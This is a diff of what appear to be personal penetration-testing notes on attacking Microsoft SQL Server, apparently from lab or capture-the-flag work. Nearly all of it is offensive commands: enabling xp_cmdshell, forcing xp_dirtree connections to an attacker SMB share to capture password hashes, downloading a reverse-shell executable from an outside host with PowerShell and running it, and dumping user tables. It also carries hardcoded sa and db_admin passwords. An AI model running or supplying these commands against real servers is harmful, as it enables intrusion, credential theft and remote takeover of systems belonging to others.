@@ -46,7 +46,7 @@ xp_cmdshell whoami
 enable_xp_cmdshell
 
 # set up smb share locally to grab hash
-xp_dirtree \\10.10.14.8\fake\share
+xp_dirtree \\192.168.45.178\share\file
 ```
 
 ````
@@ -60,7 +60,7 @@ xp_cmdshell 'whoami'
 go
 xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://10.10.126.147:7781/rshell.exe -OutFile c:\Users\Public\reverse.exe"'
 go
-xp_cmdshell 'c:\Users\Public\reverse.exe"'
+xp_cmdshell 'c:\Windows\Tasks\pwn.exe'
 go
 ````
 
@@ -136,7 +136,7 @@ sqlcmd -U db_admin -P 'B1@hx31234567890' -Q "USE STREAMIO_BACKUP; select usernam
 sqlcmd -?
 sqlcmd -Q "select * from sys.databases"
 sqlcmd -Q "select name from sys.databases"
-sqlcmd -Q "use ADSync; select * from ADSync..sysobjects"
+sqlcmd -Q "use umbraco; select * from umbraco..sysobjects"
 sqlcmd -Q "use ADSync; exec xp_dirtree '\\10.10.14.8\share\file'"
 sqlcmd -Q "use ADSync; select name from PK_mms_management_agent"
 ```
@@ -147,3 +147,9 @@ Invoke-SQLAudit -Verbose
 ```
 
 If AD Azure, check out "https://blog.xpnsec.com/azuread-connect-for-redteam/".
+
+sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; exec xp_cmdshell 'whoami'"
+sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'c:\Windows\Tasks\binary443.exe'"
+sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; exec xp_dirtree '\\192.168.45.178\share\file'"
+sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; select * from umbraco..cmsMember"
+sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; select * from umbraco..sysobjects"umbracoUserLogin umbracoUser umbracoUserGroup
